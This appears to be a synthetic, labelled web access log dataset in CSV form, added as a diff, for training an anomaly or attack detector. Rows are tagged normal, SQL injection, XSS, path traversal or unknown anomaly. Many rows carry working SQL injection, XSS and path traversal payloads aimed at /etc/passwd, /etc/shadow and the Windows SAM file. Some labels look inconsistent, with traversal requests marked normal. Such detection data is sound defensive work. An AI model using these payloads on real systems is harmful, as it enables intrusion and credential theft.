@@ -1,0 +1,501 @@
+﻿ip,timestamp,method,url,status,size,user_agent,url_length,special_char_ratio,has_sql_keywords,has_xss_pattern,path_depth,num_query_params,anomaly_score,is_anomaly,anomaly_type
+192.168.1.10,20/May/2025:08:05:24 +0800,GET,/note?content=<math><mtext></mtext><mglyph><svg><mtext><textarea><path id='</textarea><img onerror=alert(1) src=1>'>,404,4648,python-requests/2.31.0,116,0.27586206896551724,1,1,0,1,0.8545791838529894,1,XSS攻击
+45.33.32.100,20/May/2025:22:19:27 +0800,GET,/terms.html,304,313,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+1.1.1.1,20/May/2025:19:51:23 +0800,GET,/category/clothing,200,13100,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,18,0.1111111111111111,0,0,1,0,0.12088889255257311,0,正常
+172.16.0.15,20/May/2025:22:19:43 +0800,GET,/api/products?page=1,200,18793,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,20,0.2,0,0,1,1,0.17589686625199608,0,正常
+10.0.0.8,20/May/2025:16:40:42 +0800,GET,/get?file=/var/log/apache2/access.log,200,2413,Wget/1.21.3,37,0.1891891891891892,0,0,0,1,0.20481172201196501,0,正常
+203.0.113.10,20/May/2025:20:44:18 +0800,GET,/images/logo.png,200,863,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,16,0.125,0,0,1,0,0.1790458069822886,0,正常
+10.0.0.12,20/May/2025:13:42:35 +0800,GET,/static/fonts/arial.woff,200,43255,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,24,0.125,0,0,2,0,0.5425787596690497,0,正常
+172.16.0.15,20/May/2025:13:56:51 +0800,GET,/css/style.css,200,39158,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,14,0.14285714285714285,0,0,1,0,0.19931633558722886,0,正常
+192.168.1.12,20/May/2025:14:21:00 +0800,GET,/api/item?id=1; DROP TABLE users;--,200,996,Wget/1.21.3,35,0.22857142857142856,1,0,1,1,0.585441435853197,1,SQL注入
+172.16.0.7,20/May/2025:12:40:23 +0800,GET,/category/clothing,200,12530,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,18,0.1111111111111111,0,0,1,0,0.12088889255257311,0,正常
+10.0.0.5,20/May/2025:20:39:37 +0800,GET,/view?template=../../../windows/system32/config/sam,400,1587,Mozilla/5.0 (compatible; Nmap Scripting Engine),51,0.17647058823529413,0,0,0,1,0.36498470508254666,1,路径遍历
+1.1.1.1,20/May/2025:15:19:13 +0800,GET,/api/user?id=3,301,9368,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,14,0.2857142857142857,0,0,1,1,0.4250937424549962,0,正常
+8.8.8.8,20/May/2025:23:28:27 +0800,GET,/profile/settings,200,26358,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,17,0.11764705882352941,0,0,1,0,0.10452535195500579,0,正常
+10.0.0.12,20/May/2025:15:17:59 +0800,GET,/index.html,200,806,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+203.0.113.5,20/May/2025:11:02:57 +0800,GET,/contact.html,200,3573,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,13,0.07692307692307693,0,0,0,0,0.3762649369429833,0,正常
+10.0.0.5,20/May/2025:11:24:30 +0800,GET,/search?q=<body onload=alert(1)>,400,4065,Wget/1.21.3,32,0.25,0,1,0,1,0.25939519289033136,1,XSS攻击
+192.168.1.12,20/May/2025:19:04:52 +0800,GET,/api/v2/data?limit=20&offset=0,200,22467,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,30,0.23333333333333334,0,0,2,2,0.8321492608079802,1,未知异常
+172.16.0.15,20/May/2025:03:43:22 +0800,GET,/help/faq.html,301,7813,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,14,0.14285714285714285,0,0,1,0,0.19931633558722886,0,正常
+192.168.1.10,20/May/2025:22:37:27 +0800,GET,/dashboard,301,21369,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,10,0.1,0,0,0,0,0.4211127014307052,0,正常
+10.0.0.5,20/May/2025:02:58:36 +0800,GET,/view?id=1'; EXEC xp_cmdshell('dir');--,500,214,Wget/1.21.3,39,0.3076923076923077,1,0,0,1,0.481063911123328,1,SQL注入
+192.168.1.10,20/May/2025:08:32:59 +0800,GET,/download?file=../../../etc/passwd,500,1089,sqlmap/1.7,34,0.20588235294117646,0,0,0,1,0.2130243670859868,1,路径遍历
+192.168.1.11,20/May/2025:16:51:31 +0800,GET,/api/item?id=1; DROP TABLE users;--,400,2488,sqlmap/1.7,35,0.22857142857142856,1,0,1,1,0.585441435853197,1,SQL注入
+114.114.114.114,20/May/2025:07:56:26 +0800,GET,/terms.html,301,24048,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+10.0.0.20,20/May/2025:17:47:36 +0800,GET,/input?val=<iframe src=javascript:alert(1)>,200,3442,Wget/1.21.3,43,0.18604651162790697,0,1,0,1,0.21790216986509967,1,XSS攻击
+114.114.114.114,20/May/2025:21:57:11 +0800,GET,/robots.txt,200,8065,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+223.5.5.5,20/May/2025:19:57:04 +0800,GET,/category/clothing,301,46694,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,18,0.1111111111111111,0,0,1,0,0.12088889255257311,0,正常
+10.0.0.8,20/May/2025:05:16:38 +0800,GET,/images/../../../etc/hosts,200,2604,Wget/1.21.3,26,0.23076923076923078,0,0,5,0,1.0,1,路径遍历
+10.0.0.20,20/May/2025:20:39:52 +0800,GET,/css/bootstrap.min.css,200,7504,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,22,0.09090909090909091,0,0,1,0,0.37134367342794,0,正常
+192.168.1.11,20/May/2025:06:31:32 +0800,GET,/api/data?id=1' OR 'a'='a,200,441,curl/8.4.0,25,0.36,1,0,1,1,0.6657606811381037,1,SQL注入
+203.0.113.5,20/May/2025:04:23:29 +0800,GET,/api/user?id=3,200,24507,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,14,0.2857142857142857,0,0,1,1,0.4250937424549962,0,正常
+172.16.0.7,20/May/2025:06:45:33 +0800,GET,/images/logo.png,200,43783,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,16,0.125,0,0,1,0,0.1790458069822886,0,正常
+223.5.5.5,20/May/2025:17:46:55 +0800,GET,/login.html,200,46122,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+172.16.0.7,20/May/2025:21:01:48 +0800,GET,/about.html,200,8680,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+1.1.1.1,20/May/2025:19:01:36 +0800,GET,/dashboard,200,18138,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,10,0.1,0,0,0,0,0.4211127014307052,0,正常
+1.1.1.1,20/May/2025:21:18:31 +0800,GET,/contact.html,301,29276,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,13,0.07692307692307693,0,0,0,0,0.3762649369429833,0,正常
+192.168.1.12,20/May/2025:12:23:20 +0800,GET,/include?page=..%c0%af..%c0%af..%c0%afetc/passwd,500,1938,Wget/1.21.3,36,0.1111111111111111,0,0,0,1,0.3720467579562914,0,正常
+1.1.1.1,20/May/2025:22:37:05 +0800,GET,/static/fonts/arial.woff,200,35449,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,24,0.125,0,0,2,0,0.5425787596690497,0,正常
+10.0.0.5,20/May/2025:15:58:19 +0800,GET,/search?q=<script>alert(1)</script>,400,3812,Hydra/9.4,35,0.2857142857142857,0,1,0,1,0.2903738868700842,1,XSS攻击
+192.168.1.11,20/May/2025:09:49:32 +0800,GET,/api/notifications?unread=true,200,37857,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,30,0.13333333333333333,0,0,1,1,0.27730928082755046,0,正常
+10.0.0.5,20/May/2025:14:53:19 +0800,GET,/note?content=<math><mtext></mtext><mglyph><svg><mtext><textarea><path id='</textarea><img onerror=alert(1) src=1>'>,500,2788,python-requests/2.31.0,116,0.27586206896551724,1,1,0,1,0.8545791838529894,1,XSS攻击
+45.33.32.100,20/May/2025:05:38:13 +0800,GET,/help/faq.html,301,19875,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,14,0.14285714285714285,0,0,1,0,0.19931633558722886,0,正常
+8.8.8.8,20/May/2025:23:56:54 +0800,GET,/api/products?page=1,200,36368,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,20,0.2,0,0,1,1,0.17589686625199608,0,正常
+192.168.1.15,20/May/2025:18:41:14 +0800,GET,/input?val=<iframe src=javascript:alert(1)>,403,3600,curl/8.4.0,43,0.18604651162790697,0,1,0,1,0.21790216986509967,1,XSS攻击
+192.168.1.12,20/May/2025:23:25:13 +0800,GET,/read?path=....//....//....//etc/passwd,500,1158,curl/8.4.0,39,0.2564102564102564,0,0,0,1,0.2299033851549451,1,路径遍历
+10.0.0.20,20/May/2025:05:36:56 +0800,GET,/review?text=<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,400,1187,Mozilla/5.0 (compatible; Nmap Scripting Engine),59,0.23728813559322035,1,1,0,1,0.4725875135982099,1,XSS攻击
+192.168.1.11,20/May/2025:18:13:48 +0800,GET,/view?template=../../../windows/system32/config/sam,400,2162,Hydra/9.4,51,0.17647058823529413,0,0,0,1,0.36498470508254666,1,路径遍历
+172.16.0.7,20/May/2025:15:15:50 +0800,GET,/contact.html,200,28707,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,13,0.07692307692307693,0,0,0,0,0.3762649369429833,0,正常
+192.168.1.15,20/May/2025:11:11:08 +0800,GET,/load?name=..%252f..%252f..%252fetc/passwd,400,2029,sqlmap/1.7,36,0.19444444444444445,0,0,0,1,0.2007618285473515,0,正常
+66.249.66.1,20/May/2025:23:06:14 +0800,GET,/category/electronics,200,4493,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
+203.0.113.10,20/May/2025:03:57:01 +0800,GET,/static/fonts/arial.woff,304,14433,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,24,0.125,0,0,2,0,0.5425787596690497,0,正常
+192.168.1.10,20/May/2025:23:49:42 +0800,GET,/sitemap.xml,200,33838,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,12,0.08333333333333333,0,0,0,0,0.1632650542420437,0,正常
+8.8.8.8,20/May/2025:03:47:27 +0800,GET,/blog/post-1.html,301,47910,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,17,0.17647058823529413,0,0,1,0,0.15003993332316024,0,正常
+198.51.100.7,20/May/2025:16:37:32 +0800,GET,/category/electronics,304,18161,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
+223.5.5.5,20/May/2025:20:46:33 +0800,GET,/api/orders?status=active,304,22503,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,25,0.16,0,0,1,1,0.3559522842791986,0,正常
+66.249.66.1,20/May/2025:02:03:07 +0800,GET,/static/fonts/arial.woff,200,30875,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,24,0.125,0,0,2,0,0.5425787596690497,0,正常
+10.0.0.12,20/May/2025:18:23:05 +0800,GET,/blog/post-1.html,301,47653,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,17,0.17647058823529413,0,0,1,0,0.15003993332316024,0,正常
+203.0.113.5,20/May/2025:00:10:22 +0800,GET,/downloads/manual.pdf,200,28668,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
+198.51.100.7,20/May/2025:20:26:22 +0800,GET,/sitemap.xml,301,25830,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,12,0.08333333333333333,0,0,0,0,0.1632650542420437,0,正常
+172.16.0.15,20/May/2025:11:02:07 +0800,GET,/api/user?id=3,301,10242,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,14,0.2857142857142857,0,0,1,1,0.4250937424549962,0,正常
+192.168.1.12,20/May/2025:19:13:11 +0800,GET,/user?name=admin' OR '1'='1,200,985,Mozilla/5.0 (compatible; Nmap Scripting Engine),27,0.2962962962962963,1,0,0,1,0.41662268419892706,1,SQL注入
+10.0.0.20,20/May/2025:21:53:14 +0800,GET,/static/fonts/arial.woff,200,34376,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,24,0.125,0,0,2,0,0.5425787596690497,0,正常
+114.114.114.114,20/May/2025:07:55:04 +0800,GET,/category/clothing,200,32111,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,18,0.1111111111111111,0,0,1,0,0.12088889255257311,0,正常
+192.168.1.12,20/May/2025:03:53:45 +0800,GET,/..%2F..%2F..%2Fetc%2Fpasswd,200,1437,Wget/1.21.3,20,0.25,0,0,4,0,0.7004716638371997,1,未知异常
+10.0.0.8,20/May/2025:12:48:45 +0800,GET,/images/../../../etc/hosts,500,1180,Mozilla/5.0 (compatible; Nmap Scripting Engine),26,0.23076923076923078,0,0,5,0,1.0,1,路径遍历
+114.114.114.114,20/May/2025:15:53:17 +0800,GET,/robots.txt,200,30232,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+66.249.66.1,20/May/2025:00:45:08 +0800,GET,/favicon.ico,301,43310,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,12,0.08333333333333333,0,0,0,0,0.1632650542420437,0,正常
+45.33.32.100,20/May/2025:18:38:44 +0800,GET,/api/user?id=3,200,31991,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,14,0.2857142857142857,0,0,1,1,0.4250937424549962,0,正常
+192.168.1.10,20/May/2025:15:58:02 +0800,GET,/robots.txt,200,46491,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+192.168.1.11,20/May/2025:14:30:10 +0800,GET,/api/search?q=phone,200,12809,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,19,0.21052631578947367,0,0,1,1,0.2513199505315775,0,正常
+10.0.0.5,20/May/2025:07:12:21 +0800,GET,/api/search?q=phone,200,33091,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,19,0.21052631578947367,0,0,1,1,0.2513199505315775,0,正常
+66.249.66.1,20/May/2025:09:28:31 +0800,GET,/js/main.js,301,44445,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,11,0.18181818181818182,0,0,1,0,0.23096919067634897,0,正常
+10.0.0.12,20/May/2025:14:13:40 +0800,GET,/robots.txt,200,37252,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+172.16.0.3,20/May/2025:09:47:10 +0800,GET,/index.html,200,36414,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+10.0.0.20,20/May/2025:12:45:31 +0800,GET,/profile/settings,200,22789,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,17,0.11764705882352941,0,0,1,0,0.10452535195500579,0,正常
+192.168.1.15,20/May/2025:19:27:36 +0800,GET,/api/v2/data?limit=20&offset=0,200,24096,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,30,0.23333333333333334,0,0,2,2,0.8321492608079802,1,未知异常
+192.168.1.12,20/May/2025:09:46:51 +0800,GET,/search?q=<script>alert(1)</script>,200,3958,Hydra/9.4,35,0.2857142857142857,0,1,0,1,0.2903738868700842,1,XSS攻击
+10.0.0.8,20/May/2025:13:26:20 +0800,GET,/redirect?url=javascript:alert(document.domain),403,2426,sqlmap/1.7,47,0.10638297872340426,0,1,0,1,0.42715866125403645,1,XSS攻击
+192.168.1.10,20/May/2025:18:13:31 +0800,GET,/static/../../../etc/shadow,404,1223,Hydra/9.4,27,0.2222222222222222,0,0,5,0,0.9699957818696624,1,路径遍历
+203.0.113.10,20/May/2025:07:28:28 +0800,GET,/images/banner.jpg,200,46875,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,18,0.1111111111111111,0,0,1,0,0.12088889255257311,0,正常
+66.249.66.1,20/May/2025:01:10:12 +0800,GET,/css/style.css,200,8351,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,14,0.14285714285714285,0,0,1,0,0.19931633558722886,0,正常
+10.0.0.8,20/May/2025:11:12:38 +0800,GET,/index.html,200,15765,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+192.168.1.15,20/May/2025:12:52:23 +0800,GET,/help/faq.html,304,3283,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,14,0.14285714285714285,0,0,1,0,0.19931633558722886,0,正常
+223.5.5.5,20/May/2025:02:25:53 +0800,GET,/login.html,200,501,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+45.33.32.100,20/May/2025:02:37:57 +0800,GET,/api/orders?status=active,304,38081,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,25,0.16,0,0,1,1,0.3559522842791986,0,正常
+1.1.1.1,20/May/2025:10:50:06 +0800,GET,/api/notifications?unread=true,200,22826,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,30,0.13333333333333333,0,0,1,1,0.27730928082755046,0,正常
+192.168.1.10,20/May/2025:18:20:42 +0800,GET,/..%2f..%2f..%2fetc/passwd,200,1282,Mozilla/5.0 (compatible; Nmap Scripting Engine),20,0.25,0,0,4,0,0.7004716638371997,1,未知异常
+192.168.1.15,20/May/2025:16:24:29 +0800,GET,/page?q=<svg onload=alert('XSS')>,403,1569,sqlmap/1.7,33,0.30303030303030304,1,1,0,1,0.3189416824714734,1,XSS攻击
+172.16.0.3,20/May/2025:04:23:37 +0800,GET,/sitemap.xml,200,12496,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,12,0.08333333333333333,0,0,0,0,0.1632650542420437,0,正常
+192.168.1.12,20/May/2025:22:03:22 +0800,GET,/view?template=../../../windows/system32/config/sam,403,1395,Hydra/9.4,51,0.17647058823529413,0,0,0,1,0.36498470508254666,1,路径遍历
+172.16.0.3,20/May/2025:00:21:26 +0800,GET,/sitemap.xml,304,35129,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,12,0.08333333333333333,0,0,0,0,0.1632650542420437,0,正常
+10.0.0.12,20/May/2025:23:30:36 +0800,GET,/index.html,200,35845,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+192.168.1.12,20/May/2025:15:55:02 +0800,GET,/js/app.js,304,47669,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,10,0.2,0,0,1,0,0.36607100387519964,0,正常
+172.16.0.3,20/May/2025:18:41:27 +0800,GET,/profile/settings,200,33009,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,17,0.11764705882352941,0,0,1,0,0.10452535195500579,0,正常
+192.168.1.10,20/May/2025:01:54:56 +0800,GET,/api/products?page=1,200,11670,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,20,0.2,0,0,1,1,0.17589686625199608,0,正常
+192.168.1.10,20/May/2025:13:18:09 +0800,GET,/profile?name=<script>document.cookie</script>,404,1881,Wget/1.21.3,46,0.17391304347826086,0,1,0,1,0.2782187912521493,1,XSS攻击
+10.0.0.12,20/May/2025:09:35:02 +0800,GET,/images/../../../etc/hosts,400,1771,Wget/1.21.3,26,0.23076923076923078,0,0,5,0,1.0,1,路径遍历
+114.114.114.114,20/May/2025:07:17:05 +0800,GET,/help/faq.html,304,35001,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,14,0.14285714285714285,0,0,1,0,0.19931633558722886,0,正常
+198.51.100.7,20/May/2025:06:56:55 +0800,GET,/robots.txt,200,27041,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+10.0.0.12,20/May/2025:14:52:41 +0800,GET,/index.html,200,7380,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+203.0.113.10,20/May/2025:20:32:56 +0800,GET,/api/user?id=3,200,3643,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,14,0.2857142857142857,0,0,1,1,0.4250937424549962,0,正常
+223.5.5.5,20/May/2025:22:03:04 +0800,GET,/category/clothing,200,17018,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,18,0.1111111111111111,0,0,1,0,0.12088889255257311,0,正常
+114.114.114.114,20/May/2025:18:41:18 +0800,GET,/static/fonts/arial.woff,200,26780,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,24,0.125,0,0,2,0,0.5425787596690497,0,正常
+45.33.32.100,20/May/2025:08:37:24 +0800,GET,/register.html,301,7312,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,14,0.07142857142857142,0,0,0,0,0.5039821135789101,0,正常
+114.114.114.114,20/May/2025:19:27:02 +0800,GET,/js/app.js,200,45446,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,10,0.2,0,0,1,0,0.36607100387519964,0,正常
+45.33.32.100,20/May/2025:20:50:40 +0800,GET,/about.html,200,47924,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+192.168.1.10,20/May/2025:10:14:51 +0800,GET,/images/logo.png,304,37414,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,16,0.125,0,0,1,0,0.1790458069822886,0,正常
+114.114.114.114,20/May/2025:00:02:56 +0800,GET,/dashboard,200,38633,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,10,0.1,0,0,0,0,0.4211127014307052,0,正常
+192.168.1.12,20/May/2025:05:56:10 +0800,GET,"/query?q=1' UNION SELECT concat(user,0x3a,password) FROM users--",403,3540,curl/8.4.0,64,0.125,1,0,0,1,0.47108952359647344,1,SQL注入
+10.0.0.12,20/May/2025:16:55:41 +0800,GET,/page?q=<svg onload=alert('XSS')>,403,3686,Mozilla/5.0 (compatible; Nmap Scripting Engine),33,0.30303030303030304,1,1,0,1,0.3189416824714734,1,XSS攻击
+192.168.1.12,20/May/2025:10:32:52 +0800,GET,/search?q=<script>alert(1)</script>,500,2152,python-requests/2.31.0,35,0.2857142857142857,0,1,0,1,0.2903738868700842,1,XSS攻击
+1.1.1.1,20/May/2025:19:25:21 +0800,GET,/robots.txt,200,15129,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+66.249.66.1,20/May/2025:03:28:12 +0800,GET,/terms.html,200,49995,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+198.51.100.7,20/May/2025:11:16:37 +0800,GET,/index.html,200,30207,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+10.0.0.5,20/May/2025:14:20:17 +0800,GET,/api/v2/data?limit=20&offset=0,200,32884,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,30,0.23333333333333334,0,0,2,2,0.8321492608079802,1,未知异常
+192.168.1.12,20/May/2025:17:14:30 +0800,GET,/api/products?page=1,200,32261,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,20,0.2,0,0,1,1,0.17589686625199608,0,正常
+8.8.8.8,20/May/2025:19:50:17 +0800,GET,/terms.html,200,30734,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+203.0.113.5,20/May/2025:20:23:07 +0800,GET,/index.html,301,38240,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+10.0.0.5,20/May/2025:17:59:45 +0800,GET,/note?content=<math><mtext></mtext><mglyph><svg><mtext><textarea><path id='</textarea><img onerror=alert(1) src=1>'>,200,4686,Hydra/9.4,116,0.27586206896551724,1,1,0,1,0.8545791838529894,1,XSS攻击
+45.33.32.100,20/May/2025:03:28:25 +0800,GET,/profile/settings,200,1856,Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36,17,0.11764705882352941,0,0,1,0,0.10452535195500579,0,正常
+192.168.1.12,20/May/2025:11:18:18 +0800,GET,/detail?id=1 OR 1=1#,500,577,Wget/1.21.3,20,0.25,1,0,0,1,0.38938665326318955,1,SQL注入
+114.114.114.114,20/May/2025:10:50:13 +0800,GET,/blog/post-2.html,200,22565,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,17,0.17647058823529413,0,0,1,0,0.15003993332316024,0,正常
